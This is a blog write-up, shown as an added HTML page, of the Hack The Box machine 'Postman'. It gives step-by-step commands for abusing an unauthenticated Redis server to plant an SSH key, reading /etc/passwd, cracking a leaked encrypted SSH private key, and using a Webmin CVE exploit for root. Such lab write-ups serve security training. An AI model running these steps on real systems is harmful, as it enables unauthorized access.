@@ -1,0 +1,695 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Postman - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Postman was a somewhat frustrating box because we had to find the correct user directory where to write our SSH key using the unprotected Redis instance. I expected to be able to use a wordlist to scan through /home and find a valid user but on this box the redis user was configured with a valid login shell so I had to guess that and write my SSH key to /var/lib/redis/.ssh instead. The rest of the box was pretty straightforward, crack some SSH private key then pop a root shell with a Webmin CVE.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Postman - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-postman/">
+
+
+  <meta property="og:description" content="Postman was a somewhat frustrating box because we had to find the correct user directory where to write our SSH key using the unprotected Redis instance. I expected to be able to use a wordlist to scan through /home and find a valid user but on this box the redis user was configured with a valid login shell so I had to guess that and write my SSH key to /var/lib/redis/.ssh instead. The rest of the box was pretty straightforward, crack some SSH private key then pop a root shell with a Webmin CVE.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-postman/postman_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-03-14T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-postman/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Postman - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Postman - Hack The Box">
+    <meta itemprop="description" content="Postman was a somewhat frustrating box because we had to find the correct user directory where to write our SSH key using the unprotected Redis instance. I expected to be able to use a wordlist to scan through /home and find a valid user but on this box the redis user was configured with a valid login shell so I had to guess that and write my SSH key to /var/lib/redis/.ssh instead. The rest of the box was pretty straightforward, crack some SSH private key then pop a root shell with a Webmin CVE.">
+    <meta itemprop="datePublished" content="March 14, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Postman - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-03-14T00:00:00+01:00">March 14, 2020 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-postman/postman_logo.png" alt=""></p>
+
+<p>Postman was a somewhat frustrating box because we had to find the correct user directory where to write our SSH key using the unprotected Redis instance. I expected to be able to use a wordlist to scan through /home and find a valid user but on this box the redis user was configured with a valid login shell so I had to guess that and write my SSH key to /var/lib/redis/.ssh instead. The rest of the box was pretty straightforward, crack some SSH private key then pop a root shell with a Webmin CVE.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>Use the unauthenticated Redis server to write our SSH public key to the redis user’s authorized_keys file</li>
+  <li>From the redis user shell, discover the private key for user Matt inside /opt directory and crack it with john</li>
+  <li>Use Matt’s credentials to log in to Webmin and exploit CVE-2019-12840 to get a shell as root</li>
+</ul>
+
+<h2 id="portscan">Portscan</h2>
+
+<p>The ports show the box is running SSH, Apache, Redis and Webmin:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -sC -sV -p- 10.10.10.160
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 16:33 EDT
+Nmap scan report for 10.10.10.160
+Host is up (0.019s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek's Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.76 seconds
+</code></pre></div></div>
+
+<h2 id="website">Website</h2>
+
+<p>The website is currently under construction and there is nothing on it, except a possible email address at the bottom.</p>
+
+<p><img src="/assets/images/htb-writeup-postman/website1.png" alt=""></p>
+
+<p><img src="/assets/images/htb-writeup-postman/website1a.png" alt=""></p>
+
+<p>I scanned the website with gobuster to find hidden files and directories.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb# gobuster dir -t 50 -w /opt/SecLists/Discovery/Web-Content/big.txt -x php -u http://postman.htb
+
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/js (Status: 301)
+/server-status (Status: 403)
+/upload (Status: 301)
+</code></pre></div></div>
+
+<p>Indexing was enabled on <code class="language-plaintext highlighter-rouge">/upload</code> but there was nothing interesting in there.</p>
+
+<p><img src="/assets/images/htb-writeup-postman/upload.png" alt=""></p>
+
+<h2 id="webmin">Webmin</h2>
+
+<p>Webmin is a web-based system configuration tool. As shown below, HTTPS is needed to connect to the port 10000.</p>
+
+<p><img src="/assets/images/htb-writeup-postman/webmin1.png" alt=""></p>
+
+<p><img src="/assets/images/htb-writeup-postman/webmin2.png" alt=""></p>
+
+<p>The nmap scan I ran earlier already discovered the webmin version used on the system from the <code class="language-plaintext highlighter-rouge">Server</code> header: <code class="language-plaintext highlighter-rouge">MiniServ/1.910</code></p>
+
+<p>Based on Exploit-DB, I saw see there are multiple exploits available for this version:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)
+Webmin 1.920 - Remote Code Execution
+Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)
+</code></pre></div></div>
+
+<p>The Metasploit module for version 1.920 only works for the backdoored version of Webmin and doesn’t work here on this box:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(linux/http/webmin_backdoor) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.20:4444 
+[-] Exploit aborted due to failure: not-vulnerable: Set ForceExploit to override
+[*] Exploit completed, but no session was created.
+</code></pre></div></div>
+
+<p>The other exploit for CVE-2019-12840 requires authentication so I wasn’t able to use it without creds.</p>
+
+<blockquote>
+  <p>Description:
+This module exploits an arbitrary command execution vulnerability in 
+Webmin 1.910 and lower versions. Any user authorized to the “Package 
+Updates” module can execute arbitrary commands with root privileges.</p>
+</blockquote>
+
+<h2 id="redis">Redis</h2>
+
+<p>Next I checked out to the Redis instance. I used the redis-tools package to interact with Redis. As shown below, we don’t need to be authenticated to read and write to the database.</p>
+
+<p><img src="/assets/images/htb-writeup-postman/redis1.png" alt=""></p>
+
+<p>Because this instance of Redis is not protected, it’s possible to write arbitrary data to disk using the Redis save functionality. For this attack, I uploaded my SSH public key to the home folder then I was able to SSH in to the box.</p>
+
+<p>Here are the blogs that I used when doing the box:</p>
+<ul>
+  <li><a href="http://antirez.com/news/96">http://antirez.com/news/96</a></li>
+  <li><a href="https://github.com/psmiraglia/ctf/blob/master/kevgir/000-redis.md">https://github.com/psmiraglia/ctf/blob/master/kevgir/000-redis.md</a></li>
+</ul>
+
+<p>First, I had to find a list of valid users on the box so I scanned for existing user directories using a wordlist and a <a href="https://github.com/psmiraglia/ctf/blob/master/kevgir/scripts/redis-oracle.py">script</a>.</p>
+
+<p>I tried running a couple of wordlist without success then decided to manually verify what’s going on.</p>
+
+<p><img src="/assets/images/htb-writeup-postman/redis2.png" alt=""></p>
+
+<p>From the screenshot, we can see that the enumeration technique works: it returns an <code class="language-plaintext highlighter-rouge">OK</code> message if the directory is writeable, <code class="language-plaintext highlighter-rouge">No such file or directory</code> if it doesn’t exist and <code class="language-plaintext highlighter-rouge">Permission denied</code> if we don’t have access to it. I previously tried a whole bunch of directories inside <code class="language-plaintext highlighter-rouge">/home</code> but I don’t even have access to its parent directory.</p>
+
+<p>Finding the correct directory took a while. I installed redis to see what is the standard installation path. On Kali Linux, the apt installation creates the following user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis:x:133:145::/var/lib/redis:/usr/sbin/nologin
+</code></pre></div></div>
+
+<p>I verified that the directory exists on the box:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.160:6379&gt; CONFIG SET dir "/var/lib/redis"
+OK
+</code></pre></div></div>
+
+<p>On a normal installation we would not be able to do anything with this user since the login shell is set to <code class="language-plaintext highlighter-rouge">/usr/sbin/nologin</code> but on Postman the login shell is set to <code class="language-plaintext highlighter-rouge">/bin/bash</code>. Here are the steps I followed to put my SSH key on the server.</p>
+
+<p>Step 1. Generate blob to be injected</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/postman# echo -e '\n\n' &gt;&gt; blob.txt
+root@kali:~/htb/postman# cat ~/.ssh/id_rsa.pub &gt;&gt; blob.txt
+root@kali:~/htb/postman# echo -e '\n\n' &gt;&gt; blob.txt
+</code></pre></div></div>
+
+<p>Step 2. Update the Redis configuration</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.160:6379&gt; CONFIG SET dbfilename "authorized_keys"
+OK
+10.10.10.160:6379&gt; CONFIG SET dir "/var/lib/redis/.ssh"
+OK
+</code></pre></div></div>
+
+<p>Step 3. Do the attack</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/postman# redis-cli -h 10.10.10.160 flushall
+OK
+root@kali:~/htb/postman# cat blob.txt | redis-cli -h 10.10.10.160 -x set sshblob
+OK
+root@kali:~/htb/postman# redis-cli -h 10.10.10.160 save
+OK
+</code></pre></div></div>
+
+<p>And we can now log in to the box with SSH:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/postman# ssh redis@10.10.10.160
+The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
+ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
+redis@Postman:~$
+</code></pre></div></div>
+
+<h2 id="getting-matts-credentials">Getting Matt’s credentials</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file contains another user: <code class="language-plaintext highlighter-rouge">Matt</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
+redis:x:107:114::/var/lib/redis:/bin/bash
+</code></pre></div></div>
+
+<p>After looking around for a bit, I found Matt’s SSH private key in <code class="language-plaintext highlighter-rouge">/opt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis@Postman:/opt$ ls -la
+total 12
+drwxr-xr-x  2 root root 4096 Sep 11  2019 .
+drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
+-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
+redis@Postman:/opt$ cat id_rsa.bak 
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>We’re able to crack the hash with John after converting it with ssh2john.</p>
+
+<p><img src="/assets/images/htb-writeup-postman/matt.png" alt=""></p>
+
+<p>I tried SSHing in with the password but wasn’t able to. However using <code class="language-plaintext highlighter-rouge">su</code> from the redis shell I can log in as <code class="language-plaintext highlighter-rouge">Matt</code>.</p>
+
+<p><img src="/assets/images/htb-writeup-postman/user.png" alt=""></p>
+
+<p>Looking <code class="language-plaintext highlighter-rouge">/etc/ssh/sshd_config</code> we can see that Matt is specifically denied SSH access to the box so that’s why I couldn’t SSH in directly:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+#deny users
+DenyUsers Matt
+</code></pre></div></div>
+
+<h2 id="privesc-using-webmin">Privesc using webmin</h2>
+
+<p>Now that I have a valid user, I can use the Metasploit exploit for Webmin and get root shell.</p>
+
+<p><img src="/assets/images/htb-writeup-postman/root.png" alt=""></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#redis" class="page__taxonomy-item" rel="tag">redis</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ssh" class="page__taxonomy-item" rel="tag">ssh</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#webmin" class="page__taxonomy-item" rel="tag">webmin</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-03-14T00:00:00+01:00">March 14, 2020</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-bankrobber/" class="pagination--pager" title="Bankrobber - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-forest/" class="pagination--pager" title="Forest - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
